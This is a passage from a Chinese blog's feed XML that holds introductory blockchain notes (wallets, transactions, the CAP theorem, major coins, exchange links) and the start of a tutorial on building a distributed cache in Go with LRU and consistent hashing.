alt="eaccfa66fb354fea95b5ba07c147c943 海量资源：666java.com "></p><h5 id="钱包地址"><a href="#钱包地址" class="headerlink" title="钱包地址"></a>钱包地址</h5><p>钱包地址对应银行卡的卡号。在币圈，地址其实也分很多种，我们只介绍最简单直观的——支付地址（Payment Address），也就是我们现在要说的钱包地址。</p><p>在比特币中，地址是以 1 开头的一串字母和数字的组合，字母区分大小写。</p><p>比特币钱包地址：</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/ec42cd834525c70dc599e5523a061e94%E3%80%90%E6%B5%B7%E9%87%8F%E8%B5%84%E6%BA%90%EF%BC%9A666java.com%E3%80%91.png" alt="ec42cd834525c70dc599e5523a061e94 海量资源：666java.com "></p><h5 id="获取代币"><a href="#获取代币" class="headerlink" title="获取代币"></a>获取代币</h5><p>获取代币一般有两种方式：挖矿和上数字货币交易所购买。</p><p>目前不存在人民币对数字货币的场内交易平台，所以想用人民币购买数字货币只能选择场外交易，比较有名的平台有<code>coincola.com</code>。</p><p>你如果具有投资热情，可以继续挖掘“coinmarketcap”中绿框内的选项：</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/d3092544b948ae4c6083c920584b1748%E3%80%90%E6%B5%B7%E9%87%8F%E8%B5%84%E6%BA%90%EF%BC%9A666java.com%E3%80%91.png" alt="d3092544b948ae4c6083c920584b1748 海量资源：666java.com "></p><h5 id="区块链交易"><a href="#区块链交易" class="headerlink" title="区块链交易"></a>区块链交易</h5><p>到账的过程就是产生一笔区块链交易的过程，一般交易所都会提供 TXID，就是交易哈希，供用户查询，TXID 代表了这个区块链上某一个唯一的交易，也就是类似于咱们去银行转账后提供的流水单号。</p><p>我们可以根据 TXID 可以上区块浏览器（专门用于查询交易的工具链接）上查询该币交易，比如某一笔比特币交易：<a href="https://blockchain.info/tx/6e64c2098b84b04a0d9f61a60d5bc8f5f80f37e19f3ad9c39bfe419db422b33c">https://blockchain.info/tx/6e64c2098b84b04a0d9f61a60d5bc8f5f80f37e19f3ad9c39bfe419db422b33c</a></p><p>网址<code>https://blockchain.info</code>后面这一长串就是 TXID，下图是这一笔比特币交易的详细信息。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/0b09574c87a1a5b88dcdb9106d93e4cc%E3%80%90%E6%B5%B7%E9%87%8F%E8%B5%84%E6%BA%90%EF%BC%9A666java.com%E3%80%91.png" alt="0b09574c87a1a5b88dcdb9106d93e4cc 海量资源：666java.com "></p><h5 id="发送代币给别人"><a href="#发送代币给别人" class="headerlink" title="发送代币给别人"></a>发送代币给别人</h5><p>如果要把代币发送给别人，需要对方提供钱包地址，这和银行转账需要别人提供银行卡号的道理一样。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/61d8854376d9b06ab8e98b29c2216385%E3%80%90%E6%B5%B7%E9%87%8F%E8%B5%84%E6%BA%90%EF%BC%9A666java.com%E3%80%91.png" alt="61d8854376d9b06ab8e98b29c2216385 海量资源：666java.com "></p><p>在填写好表单点击<code>确认转移</code>后，钱包程序将为你生成一笔区块链交易并广播出去，大约等待 1 分钟就会被打包进区块，这个交易在任意的区块链浏览器上可以查询得到，我们可以使用另外一个区块浏览器进行查询：<a href="https://explorer.mvs.org/#!/tx/b3eb07276dbff703ecf9e4180a2bd8e58db346e55439ef831efcbbd958726a0c">https://explorer.mvs.org/#!/tx/b3eb07276dbff703ecf9e4180a2bd8e58db346e55439ef831efcbbd958726a0c</a></p><p>这个区块链浏览器与上面一个区块浏览器不是同一个，但是都可以查询相同的交易，因为他们同属同一个主网（mainnet, 相对应的是测试网 testnet）。各大交易所的充值功能，其实就是从自己的钱包转账到交易所的钱包地址。</p><h3 id="区块链是不是万能的？"><a href="#区块链是不是万能的？" class="headerlink" title="区块链是不是万能的？"></a>区块链是不是万能的？</h3><p>区块链本身也属于分布式系统，分布式系统有哪些局限、约束，区块链一样也有。</p><p>区块链领域有个说法叫做<code>不可能三角</code>，意思是说区块链的<code>去中心化</code>,<code>安全</code>,<code>环保</code>三个要素不可能同时全部满足。</p><p>在分布式领域有个著名的CAP定理。</p><p>在 CAP 中，Consistency 是一致性，表示同样数据在分布式系统中所有地方都是被复制成相同；Availability 是可用性，表示所有在分布式系统活跃的节点都能够处理操作且能响应查询；Partition tolerance 是分区容忍性，表示不同节点之间数据同步有意外情况产生时，能够容错。</p><p>一般情况下，CAP 理论认为你不能同时拥有上述三种，只能同时选择两种。所以，当我们应用到区块链上时，可以明显地发现区块链其实是一个 AP 系统，尤其在 A 这个指标上，也就是可用性做得非常好，所以相应地，C 就会降低，反映到具体系统中的交易吞吐量上，自然会也会降低。</p><p>当我们在分区容忍性和一致性中做取舍的时候，如果强调<code>不可篡改</code>,<code>去中心化</code>这两个特性，就会明显感觉到区块链跟不上大吞吐量的业务。</p><p>所以理解了以上内容，我们在做技术选型时，如果去中心化不是强需求，还是建议使用中心化的解决方案。</p><h3 id="去中心化是不是区块链唯一的评价标准？"><a href="#去中心化是不是区块链唯一的评价标准？" class="headerlink" title="去中心化是不是区块链唯一的评价标准？"></a>去中心化是不是区块链唯一的评价标准？</h3><p>自区块链发展至今，“中心化”和“去中心化”的争论就一直存在。</p><p>支持去中心化的观点认为：区块链的初衷就是去中心化，所以也衍生出一条准则：“凡是没有做好去中心化指标的系统都不是区块链”。持有这样观点的人通常都是技术出身，或多或少都有些理想主义的极客情怀，这一点本来是无可厚非的，但市场是逐利的，情怀其实常常并没有办法变现。</p><p>所以，这导致的最直接结果就是：秉持这种去中心化原则会让区块链的落地过程异常缓慢。</p><p>持有“去中心化是唯一准则”这样的观点，往往也会误导刚刚入门的业务和产品相关的人员，误以为去中心化是区块链产品的一条评价标准。</p><p>其实并不是这样，去中心化只是一个公有区块链应当具备的基本特性，但是我们衍生到区块链应用层面的时候，其实去中心化往往并不能契合到一个公司的业务上，所以我在这里提倡：当我们在思考区块链的解决方案时，还是应当以需求为第一导向。</p><p>事实上，我们在讨论去中心化的时候，更多是夹杂了对强势的不满，这其实可以转化成“对服务者进行监督”的思路，一味地强调去中心化可能会陷入舍本逐末的尴尬境地，我们一定要看需求是什么，再去选择要不要。</p><p>换句话说，任何情况下，人与人之间必然存在信息不对称和认知不对称的问题，任何应用都会存在信息提供者和信息消费者这两种角色。</p><p>这是由人类社会结构决定的，妄图消除这两种角色之间的差异是非常难的。所以应用的“去中心化”要问运营者和消费者，而不是空喊口号。</p><p>有个常提及的词叫做<code>赋能</code>，被赋于能力的角色始终处于被动地位的，我们可以把区块链看做新型的赋能工具，至于是不是去中心化，设计过程中要看具体的应用场景，实施过程最终取决于消费者。</p><h3 id="联盟链为什么没有公有链普及？"><a href="#联盟链为什么没有公有链普及？" class="headerlink" title="联盟链为什么没有公有链普及？"></a>联盟链为什么没有公有链普及？</h3><p>所谓联盟链，就是这个区块链具有准入许可，不像公链，任何人都可以随时进入，准入许可意味着候选节点进入区块链时，需要得到已经在网络中的节点的许可，所以联盟链也叫做许可链。联盟链的节点数通常不多，维护成本相比公链要低。</p><p>造成联盟链不普及的原因，有以下三种。</p><p>第一是观察者偏差，因为 <code>To B</code> 的业务往往是商务合作的形式，并不直接进入大家的视野，实际上有很多大型机构已经尝试，或者已经部分落地了的联盟链业务。</p><p>第二是联盟链往往会遇到政策和监管要求，与公链相比，实施起来条条框框太多了，发挥的空间有限。</p><p>第三是联盟链表面上是一个技术问题，本质上是一个博弈问题。你往往需要设计一个业务模型，使得所有的博弈趋于均衡稳定，但是这又非常困难，我们无法一概而论。</p><p>总不能每做一块业务还要搞个形式化验证吧，并且联盟链无论是应用生态还是技术迭代都会比公链缓慢。所以整体上看，联盟链的应用范围仍然不及公链广泛。</p><h3 id="主流区块链项目"><a href="#主流区块链项目" class="headerlink" title="主流区块链项目"></a>主流区块链项目</h3><h5 id="比特币"><a href="#比特币" class="headerlink" title="比特币"></a>比特币</h5><p>总体来看，比特币的市值和交易量远远超过其他区块链项目。</p><p>比特币的发布时间为 2009 年 1 月 9 号，预计它的挖矿可以一直持续到 2140 年，发行总量收敛到 2100 万。比特币的出块时间是 10 分钟，出块时间是指全网平均产生一个区块的时间间隔。</p><p>比特币是所有数字资产的始祖，这带来的效果就是：比特币的公众认可度非常高，纵然面临着矿池中心化的问题，但是公众依然非常信任比特币这种资产。</p><p>比特币曾经面临过区块容量不足的问题，但随着隔离见证的生效，网络拥堵的问题缓解了很多。</p><h5 id="以太坊"><a href="#以太坊" class="headerlink" title="以太坊"></a>以太坊</h5><p>以太坊是一个区块链应用平台，它的极大创新在于它提供了<code>智能合约</code>这种可以自定义业务逻辑的工具，智能合约是一种可编程的合约，合约是由用户编写并且部署到区块链上的。</p><p>以太坊的优势是为全世界的开发者们提供了一种开发工具，这种工具让所有人都能释放出巨大的创造力，所以基本上可以看成：只要是有一定技术基础的开发者，通过智能合约可以随时为以太坊贡献内容。</p><p>这形成了一种良性循环，开发者使用智能合约的时候，发现的问题提交给以太坊开发者社区，社区改进智能合约的缺陷，新的开发者基于智能合约开发多样性的工具包，这种核心开发者与社区互动的良性循环是以太坊生态最重要的一部分。</p><p>以太坊的口号是“世界计算机”，从这句口号里，可见它野心的大小。在 2016 年的时候，以太坊的市值大约是比特币的十分之一，在 2017 年，这个数字已经达到四分之一。</p><p>以太坊在 2014 年开始众筹，2015 年 3 月份正式运行，它采取的共识机制是 PoW，但根据核心团队公布的方案，后期会逐渐迁移到 PoS 共识算法。以太坊的总发行量是：6000 万+1872 万 &#x2F; 年，目前的区块时间是 12 秒。</p><p>同时我们从以太坊社区可以看到，以太坊绝大部分开发流程和智能合约都已经形成行业标准，</p><p>比如常见的 ERC20 代币标准，ERC725 身份标准。</p><p>而 ERC20 代币标准，则为智能合约指明了主要的业务方向：数字资产，有的叫智能资产，它们的含义差不多。以太坊 2017 价格大幅上涨，最直接的原因就是：ERC20 代币成为事实意义上的区块链标准资产。</p><h5 id="瑞波币"><a href="#瑞波币" class="headerlink" title="瑞波币"></a>瑞波币</h5><p>瑞波币（Ripple）是一个比较另类的区块链项目，因为从本质上来说，它更像是一种支付结算协议，瑞波币不需要挖矿，它是通过一种叫“Open Coin”的算法，提供瑞波协议共识来达到记账的目的。</p><p>瑞波币旨在为全球跨境机构提供了高效率的支付过程，提供较好的全球支付体验。因为涉及了机构之间的资产转移，瑞波币被设计成需要准入许可才能进入瑞波的支付网络，这一点有些像我们所说的联盟链。</p><p>瑞波团队掌握了一半以上的瑞波币，所以瑞波币面临的币价被操纵的问题很严重。如果你是一个技术极客，那么你可以略过该项目。如果你想创建一个有关支付结算的区块链项目，那么一定要研究瑞波币。</p><h5 id="莱特币"><a href="#莱特币" class="headerlink" title="莱特币"></a>莱特币</h5><p>莱特币在技术上仅仅把比特币的挖矿算法修改成了 Scrypt 算法，Scrypt 算法是一个可参数化、可配置的挖矿算法，不过它依然没有防住专业矿机的出现。它的其他核心代码几乎与比特币保持一致。</p><p>莱特币的崛起得益于良好的市场运作，从提供的功能来看，莱特币与比特币没有区别。那么说，为什么还要有莱特币呢？</p><p>比特币扩容之争的核心焦点在是否使用“隔离见证”的方法，“隔离见证”虽然在比特币社区提出，但是第一个应用的地方是莱特币，即：莱特币作为比特币的先行者，它会替代比特币做一些具有实验性质的试运行。</p><h5 id="比特现金"><a href="#比特现金" class="headerlink" title="比特现金"></a>比特现金</h5><p>与比特币相比，比特现金仅仅是从区块容量上高于</p><p>比特币，其他技术上的区别并不是很大。</p><p>比特现金的诞生要从比特币扩容之争开始谈起，由于比特币的区块容量是 1MB，随着用户增多，交易愈发拥堵。</p><p>所以围绕着提升网络容量，社区内部发生了分歧，“支持隔离见证”与”支持直接扩大区块尺寸”分成了两派，这就是著名的扩容之争。</p><p>比特币核心开发者们支持前者，矿工们支持后者，由于比特币核心开发者掌握了代码的控制权，但是矿工掌握了记账权，所以两权发生了分离，矿工索性一拍大腿，你不改代码，我花钱找人改，这就产生了比特现金。</p><p>比特现金作为社区共识分裂的产物，体现了区块链开放共识的特点，你不支持我，我分分钟就可以独立出来。</p><h5 id="Tether"><a href="#Tether" class="headerlink" title="Tether"></a>Tether</h5><p>Tether 也是一个特殊的区块链项目，它为所有区块链资产提供了法币（主要是美元）兑换网关。Tether 又称 USDT，言外之意就是和美元一对一锚定，用户存入多少美元，就会产生多少USDT 进入虚拟资产网络。USDT 可以直接在虚拟货币交易所与比特币等其他区块链资产进行交易。</p><p>Tether 可以直接在二级市场流通，是数字货币交易市场重要的交易入口。另外，Tether 可能存在被冻结和没收的风险。</p><h5 id="匿名性区块链项目"><a href="#匿名性区块链项目" class="headerlink" title="匿名性区块链项目"></a>匿名性区块链项目</h5><p>匿名性区块链项目是指：使用交易匿名技术，让公开可查询的交易内容变成私密的匿名性区块链项目。市值比较不错的有门罗币、达世币、Zcash 三种，它们分别使用了不同类型的匿名技术，为区块链技术的匿名特性发展做出了贡献。</p><p>从需求上来看，这三种都是为了解决其他所有数字货币无法匿名的问题，因为从技术上看，比特币也好，以太坊也好，交易是可以被追踪的。</p><p>所以以上三种区块链提供了不同程度的匿名，按照匿名程度分别是：达世币 &lt; 门罗币&lt;Zcash。从市场认可度来看，门罗币的匿名性最为人们所认可。</p><h5 id="国内的公有链区块链项目"><a href="#国内的公有链区块链项目" class="headerlink" title="国内的公有链区块链项目"></a>国内的公有链区块链项目</h5><p>中国的公链项目不多，分别有 NEO、量子链、元界、公信宝、比原链。</p><p>目前市值最高的是 NEO，NEO 的前身是小蚁，在经历了 2017 年初的市值低谷之后，NEO通过品牌重塑以及市场推广，目前已经稳居市值 Top10。</p><p>NEO 主打的也是智能合约，不过相比以太坊，NEO 更有方向性，旨在通过智能合约塑造一个基于区块链的智能经济。NEO 的创始人达鸿飞，也是一个非常 Nice 的大叔。</p><p>量子链是也是国内比较知名的区块链项目，它的市值稳居 Top20，与 NEO 不同的是，量子链完全支持以太坊智能合约，也就是说能在以太坊上运行的智能合约也能在量子链上运行。</p><p>量子链的创始人是戴旭光，人称帅初，是一个不到 30 岁就登上福布斯的技术极客。</p><p>元界在 2017 年初上线造成了一波市场轰动，元界是当时唯一一家既能提供数字货币交易平台服务，又能提供公链技术服务的技术团队，2017 上半年整个市场非常看好。</p><p>随即创始人初夏虎基于元界发了两个代币，由于这两个代币的运作没有跟上，导致市场恶评不断，再经过 9.4 的一刀切式监管，元界项目坠入低谷。</p><p>公信宝是比特股社区的开发者，将比特股的底层技术石墨烯技术改造成属于自己的公链项目，公信宝团队是一个靠谱的团队，市场价值也十分不错。</p><p>比原链是巴比特社区创始人长铗发起的，比原链目前负责人是段新星，比原链也是一个致力于打造资产数字化，提供资产流通的一个公链平台。</p><h3 id="相关网站"><a href="#相关网站" class="headerlink" title="相关网站"></a>相关网站</h3><p>OK 国际站： <a href="http://www.okex.com/">www.okex.com</a> </p><p>火币网国际站： <a href="http://www.huobi.pro/">www.huobi.pro</a> </p><p>币安： <a href="http://www.binance.com/">www.binance.com</a> </p><p>中比特国际站： <a href="http://www.zb.com/">www.zb.com</a> </p><p>中比特海外版： <a href="http://www.exx.com/">www.exx.com</a> </p><p>比特儿海外版: <a href="http://www.gate.io/">www.gate.io</a> </p><p>比特时代海外版: <a href="http://www.aex.com/">www.aex.com</a> </p><p>元宝网海外版: <a href="http://www.bcex.ca/">www.bcex.ca</a> </p><p>聚币海外版: <a href="http://www.coinegg.com/">www.coinegg.com</a> </p><p>云币海外版: <a href="http://www.big.one/">www.big.one</a> </p><p>币久网海外版: <a href="http://www.cex.com/">www.cex.com</a> </p><p>币赢网: <a href="http://www.coinw.com/">www.coinw.com</a> </p><p>kex: <a href="http://www.kex.com/">www.kex.com</a> </p><h5 id="国外交易平台"><a href="#国外交易平台" class="headerlink" title="国外交易平台"></a>国外交易平台</h5><p>Bitfinex: <a href="http://www.bitfinex.com/">www.bitfinex.com</a> </p><p>B 网: <a href="http://www.bittrex.com/">www.bittrex.com</a> </p><p>R 网: <a href="http://www.rightbtc.com/">www.rightbtc.com</a> </p><p>P 网: <a href="http://www.poloniex.com/">www.poloniex.com</a> </p><p>L 网: liqui.io </p><p>H 网： hashtoken.co </p><p>CEO： <a href="http://www.bite.ceo/">www.bite.ceo</a> </p><p>BTBT： <a href="http://www.btbt.top/">www.btbt.top</a> </p><p>HitBTC: hitbtc.com </p><p>bithumb: <a href="http://www.bithumb.com/">www.bithumb.com</a> </p><p>coincheck: coincheck.com&#x2F;cn&#x2F; </p><p>bit-z: <a href="http://www.bit-z.com/">www.bit-z.com</a> </p><h5 id="去中心化交易平台"><a href="#去中心化交易平台" class="headerlink" title="去中心化交易平台"></a>去中心化交易平台</h5><p>以德： etherdelta.com </p><p>比特股： bitshares.org&#x2F;wallet&#x2F;# </p><h5 id="场外交易平台"><a href="#场外交易平台" class="headerlink" title="场外交易平台"></a>场外交易平台</h5><p>local： localbitcoins.com&#x2F;zh-cn </p><p>可盈可乐： <a href="http://www.coincola.com/">www.coincola.com/</a> </p><p>比特币世界 <a href="http://www.bitcoinworld.com/">www.bitcoinworld.com/</a> </p><p>元宝场外交易 <a href="http://www.otc789.com/">www.otc789.com/</a> </p><h5 id="看行情网站"><a href="#看行情网站" class="headerlink" title="看行情网站"></a>看行情网站</h5><p>非小号： <a href="http://www.feixiaohao.com/">www.feixiaohao.com</a> </p><p>金色财经： <a href="http://www.jinse.com/">www.jinse.com</a> </p><p>巴比特： <a href="http://www.8btc.com/">www.8btc.com</a> </p><p>bitcoin86： <a href="http://www.bitcoin86.com/">www.bitcoin86.com</a> </p><h5 id="手机看行情软件"><a href="#手机看行情软件" class="headerlink" title="手机看行情软件"></a>手机看行情软件</h5><p>mytoken，aicoin</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;深入浅出区块链笔记（1-8-区块链基础知识）&quot;&gt;&lt;a href=&quot;#深入浅出区块链笔记（1-8-区块链基础知识）&quot; class=&quot;headerlink&quot; title=&quot;深入浅出区块链笔记（1-8 区块链基础知识）&quot;&gt;&lt;/a&gt;深入浅出区块链笔记（1-8 区块链基础知</summary>
      
    
    
    
    <category term="Coding" scheme="http://blog.hoshinobunny.xyz/categories/Coding/"/>
    
    
    <category term="区块链" scheme="http://blog.hoshinobunny.xyz/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>用Go实现一个分布式缓存—GoCache</title>
    <link href="http://blog.hoshinobunny.xyz/2024/10/27/%E7%94%A8Go%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%88%86%E5%B8%83%E5%BC%8F%E7%BC%93%E5%AD%98%E2%80%94GoCache%209bd748b3e11942448bafb083dada9493/"/>
    <id>http://blog.hoshinobunny.xyz/2024/10/27/%E7%94%A8Go%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%88%86%E5%B8%83%E5%BC%8F%E7%BC%93%E5%AD%98%E2%80%94GoCache%209bd748b3e11942448bafb083dada9493/</id>
    <published>2024-10-27T11:30:49.000Z</published>
    <updated>2024-11-30T03:40:13.450Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>[!NOTE]</p><p>原项目链接：<a href="https://geektutu.com/post/geecache.html">https://geektutu.com/post/geecache.html</a></p></blockquote><h3 id="什么是分布式缓存"><a href="#什么是分布式缓存" class="headerlink" title="什么是分布式缓存"></a>什么是分布式缓存</h3><p>分布式缓存：指将应用系统和缓存组件进行分离的缓存机制，这样多个应用系统就可以共享一套缓存数据了，它的特点是共享缓存服务和可集群部署，为缓存系统提供了高可用的运行环境，以及缓存共享的程序运行机制。</p><p>分布式缓存系统是一个独立的缓存服务，与本地应用隔离，这使得多个应用系统之间可直接的共享缓存数据。目前分布式缓存系统已经成为微服务架构的重要组成部分。</p><h3 id="分布式缓存的特性"><a href="#分布式缓存的特性" class="headerlink" title="分布式缓存的特性"></a><strong>分布式缓存的特性</strong></h3><p>相对于本地应用缓存，分布式缓存具有如下特性:</p><p>高性能：当传统数据库面临大规模数据访问时，磁盘I&#x2F;O 往往成为性能瓶颈，从而导致过高的响应延迟。分布式缓存将高速内存作为数据对象的存储介质，数据以key&#x2F;value 形式存储。</p><p>动态扩展性：支持弹性扩展，通过动态增加或减少节点应对变化的数据访问负载，提供可预测的性能与扩展性；同时，最大限度地提高资源利用率；</p><p>高可用性：高可用性包含数据可用性与服务可用性两方面，故障的自动发现，自动转义。确保不会因服务器故障而导致缓存服务中断或数据丢失。</p><p>易用性：提供单一的数据与管理视图；API 接口简单,且与拓扑结构无关；动态扩展或失效恢复时无需人工配置;自动选取备份节点；多数缓存系统提供了图形化的管理控制台，便于统一维护；</p><p>通过在应用服务与DB中间引入缓存层，我们可以得到如下三个好处：<br>（1）读取速度得到提升。<br>（2）系统扩展能力得到大幅增强。我们可以通过加缓存，来让系统的承载能力提升。<br>（3）总成本下降，单台缓存即可承担原来的多台DB的请求量，大大节省了机器成本。</p><h3 id="使用缓存的目的"><a href="#使用缓存的目的" class="headerlink" title="使用缓存的目的"></a>使用缓存的目的</h3><p>缓存的目的是为了在高并发系统中有效降低DB的压力，高效的数据缓存可以极大地提高系统的访问速度和并发性能。系统会自动根据调用的方法缓存请求的数据。当再次调用该方法时，系统会首先从缓存中查找是否有相应的数据，如果命中缓存，则从缓存中读取数据并返回；如果没有命中，则请求数据库查询相应的数据并再次缓存。每一个用户请求都会先查询缓存中的数据，如果缓存命中，则会返回缓存中的数据。这样能减少数据库查询，提高系统的响应速度。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/image-20241026202630854.png" alt="image-20241026202630854"></p><h3 id="分布式缓存的应用场景"><a href="#分布式缓存的应用场景" class="headerlink" title="分布式缓存的应用场景"></a><strong>分布式缓存的应用场景</strong></h3><p>分布式缓存的典型应用场景可分为以下几类：</p><ol><li><p>页面缓存：用来缓存Web 页面的内容片段，包括HTML、CSS 和图片等，多应用于社交网站等；</p></li><li><p>应用对象缓存：缓存系统作为ORM 框架的二级缓存对外提供服务，目的是减轻数据库的负载压力，加速应用访问；</p></li><li><p>状态缓存：缓存包括Session 会话状态及应用横向扩展时的状态数据等，这类数据一般是难以恢复的，对可用性要求较高，多应用于高可用集群；</p></li><li><p>并行处理：通常涉及大量中间计算结果需要共享；</p></li><li><p>事件处理：分布式缓存提供了针对事件流的连续查询(continuous query)处理技术，满足实时性需求；</p></li><li><p>极限事务处理：分布式缓存为事务型应用提供高吞吐率、低延时的解决方案，支持高并发事务请求处理，多应用于铁路、金融服务和电信等领域；</p></li></ol><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a><strong>Redis</strong></h3><p>Redis是一种基于内存的，支持网络、分布式、可选持久性的键值对(Key-Value)存储数据库。可用作数据库，缓存，消息中间件，事件发布或订阅，高速队列等场景。支持网络，提供字符串，哈希，列表，队列，集合结构直接存取，基于内存，可持久化。同时性能强劲，具有复制特性以及解决问题而生的独一无二的数据模型。它可以存储键值对与5种不同类型的值之间的映射，可以将存储在内存的键值对数据持久化到硬盘，可以使用复制特性来扩展读性能，还可以使用客户端分片来扩展写性能。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/image-20241026202621921.png" alt="image-20241026202621921"></p><h2 id="GoCache实现流程"><a href="#GoCache实现流程" class="headerlink" title="GoCache实现流程"></a>GoCache实现流程</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">                         是</span><br><span class="line">接收 key --&gt; 检查是否被缓存 -----&gt; 返回缓存值 (<span class="number">1</span>)</span><br><span class="line">                |  否                         </span><br><span class="line">                |-----&gt; 使用一致性哈希选择节点        是                                    是</span><br><span class="line">|-----&gt; 是否是远程节点 -----&gt; HTTP 客户端访问远程节点 --&gt; 成功？-----&gt; 服务端返回返回缓存值(<span class="number">2</span>)</span><br><span class="line">         |  否                                    ↓  否</span><br><span class="line">                   |----------------------------&gt; 回退到本地节点处理。</span><br><span class="line">                            |-----&gt; 调用<span class="string">`回调函数`</span>，获取值并添加到缓存 --&gt; 返回缓存值 (<span class="number">3</span>)</span><br></pre></td></tr></table></figure><h3 id="使用LRU-Least-Recently-Used-算法实现Cache"><a href="#使用LRU-Least-Recently-Used-算法实现Cache" class="headerlink" title="使用LRU(Least Recently Used)算法实现Cache"></a>使用LRU(Least Recently Used)算法实现Cache</h3><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/image-20241026202604386.png" alt="image-20241026202604386"></p><p>  LRU 算法最核心的 2 个数据结构</p><ul><li>蓝色的是字典(map)，存储键和值的映射关系。这样根据某个键(key)查找对应的值(value)的复杂是<code>O(1)</code>，在字典中插入一条记录的复杂度也是<code>O(1)</code>。</li><li>红色的是双向链表(double linked list)实现的队列。将所有的值放到双向链表中，这样，当访问到某个值时，将其移动到队尾的复杂度是<code>O(1)</code>，在队尾新增一条记录以及删除一条记录的复杂度均为<code>O(1)</code>。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Cache <span class="keyword">struct</span> &#123;</span><br><span class="line">maxBytes  <span class="type">int64</span>                         <span class="comment">//最大可使用的内存</span></span><br><span class="line">nbytes    <span class="type">int64</span>                         <span class="comment">//当前已使用的内存</span></span><br><span class="line">ll        *list.List                    <span class="comment">//双向链表</span></span><br><span class="line">cache     <span class="keyword">map</span>[<span class="type">string</span>]*list.Element      <span class="comment">//与双向链表的节点做映射</span></span><br><span class="line">OnEvicted <span class="function"><span class="keyword">func</span><span class="params">(key <span class="type">string</span>, value Value)</span></span> <span class="comment">//某条记录被移除后执行的回调函数，可以为nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> go的标准库中有一个 <code>container包</code> ，其中包含了 <code>list（双向链表）</code>、 <code>heap（堆）</code>、 <code>ring（圈）</code> .<br><img src="https://minio.drivefly.cn:443/image-hoshino/blog/2024/11/25/image-20241026202452063.png" alt="image-20241026202452063" style="zoom: 25%;" /></p><p>这里简单介绍一下双向链表</p><p>双向链表一般用于经常对头部和尾部进行增删的场景，同时它不需要在一开始初始化它的容量，它的容量随着使用动态变化（扩大or缩小）。</p><p>go标准库中实现的list主要包含以下两个核心数据结构：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 链表的一个元素</span></span><br><span class="line"><span class="keyword">type</span> Element <span class="keyword">struct</span> &#123;</span><br><span class="line">   next, prev *Element <span class="comment">// 前后指针</span></span><br><span class="line">   list *List <span class="comment">// 所属链表</span></span><br><span class="line">   Value any <span class="comment">// 值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 链表</span></span><br><span class="line"><span class="keyword">type</span> List <span class="keyword">struct</span> &#123;</span><br><span class="line">   root Element <span class="comment">// 哨兵元素</span></span><br><span class="line">   <span class="built_in">len</span>  <span class="type">int</span>     <span class="comment">// 链表元素个数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/image-20241026202645984.png" alt="image-20241026202645984"></p><p>List支持延迟初始化，因此不管你使用list.New()创建一个已经初始化的list，或者直接使用list.List{}创建一个未初始化的list，都可以正常运行。</p><p>在调用PushFront()、PushBack()、PushFrontList()、PushBackList()时会调用 <strong>lazyInit()</strong> 检查是否已经初始化，如果没有初始化则调用 <strong>Init()</strong> 进行初始化。</p><p>List包含以下方法：</p><p><strong>PushFront()、PushBack()、PushFrontList()、PushBackList()、Front()、Back()、Len()、InsertBefore()、InsertAfter()、MoveBefore()、MoveAfter()、MoveToFront()、MoveToBack()、Remove()</strong></p></aside><h2 id="一致性哈希"><a href="#一致性哈希" class="headerlink" title="一致性哈希"></a>一致性哈希</h2><h3 id="如何分配请求？"><a href="#如何分配请求？" class="headerlink" title="如何分配请求？"></a>如何分配请求？</h3><p>现在的网站通常都由多台服务器组成的集群对外提供服务，那么对于一个集群而言，如何分配用户发起的请求？</p><p>这个问题其实就是 <code>负载均衡</code> 。解决负载均衡问题的算法很多，不同的负载均衡算法，对应的就是不同的分配策略，适应的业务场景也不同。</p><p>最简单的方式，引入一个中间的负载均衡层，让它将外界的请求轮流的转发给内部的集群。比如集群有 3 个节点，外界请求有 3 个，那么每个节点都会处理 1 个请求，达到了分配请求的目的。</p><p><img src="https://minio.drivefly.cn/image-hoshino/blog/2024/11/25/image-20241026202659456.png" alt="image-20241026202659456"></p><p>考虑到每个节点的硬件配置有所区别，我们可以引入权重值，将硬件配置更好的节点的权重值设高，然后根据各个节点的权重值，按照一定比重分配在不同的节点上，让硬件配置更好的节点承担更多的请求，这种算法叫做 <code>加权轮询</code>。</p><blockquote><p>加权轮询算法使用场景是建立在每个节点存储的数据都是相同的前提。所以，每次读数据的请求，访问任意一个节点都能得到结果。</p></blockquote><p>而在数据分片的分布式缓存系统中，由于每个节点中存储的数据都是不一致的，任意访问一个节点不一定能够命中缓存，因此采用轮询分配请求的方法并不适用。</p><h2 id="一般的哈希算法"><a href="#一般的哈希算法" class="headerlink" 